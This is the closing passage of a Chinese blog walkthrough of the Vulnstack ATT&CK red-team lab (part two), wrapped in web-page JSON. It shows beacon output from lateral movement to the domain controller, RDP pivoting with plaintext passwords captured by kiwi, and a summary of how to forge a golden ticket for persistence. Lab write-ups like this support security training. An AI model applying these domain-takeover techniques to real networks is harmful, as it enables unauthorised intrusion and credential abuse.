class=\"hljs-number\"\u003e313378\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e\n[+] Impersonated DE1AY.COM\\administrator (netonly)\n[+] received output:\nStarted service eb3da6e on DC\n[+] established link to child beacon: \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上线成功！！拿下DC\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image35.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e继续拿下\u003ccode\u003ePC\u003c/code\u003e ，和上面一样的操操作\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image36.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e横向成功，拿下了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image37.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e不进行横向利用3389\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e上面内网端口扫描发现所有主机都开启可\u003ccode\u003e3389\u003c/code\u003e端口\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e结合我们上面使用kiwi抓取的明文密码，可以直接登陆上去\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用之前开启远程桌面的\u003ccode\u003eweb\u003c/code\u003e主机作为跳板\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e连接远程桌面，在web主机里面远程\u003ccode\u003eDC\u003c/code\u003e以及\u003ccode\u003ePC\u003c/code\u003e即可\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image38.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e还可以使用永恒之蓝漏洞\u003c/h3\u003e\n\u003cp\u003e不写了\u003c/p\u003e\n\u003ch2\u003e黄金票据（权限维持）\u003c/h2\u003e\n\u003cp\u003e看我第一篇红日靶场的文章即可，主要收集\u003ccode\u003ekrbtgt\u003c/code\u003e账户的\u003ccode\u003eHTLM\u003c/code\u003e的\u003ccode\u003eHASH\u003c/code\u003e ，以及域管理员的\u003ccode\u003eSID\u003c/code\u003e ，域的名称，随便一个账户即可构造黄金票据\u003c/p\u003e","title":"Vulnstack - ATT\u0026CK红队评估实战靶场(二)","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["Vulnstack","Windows靶机","综合靶场"],"categories":"靶机"}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"Vulnstack红队评估实战靶场(二)"},"buildId":"TQkCFKbomQ5ZAXR97drm1","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>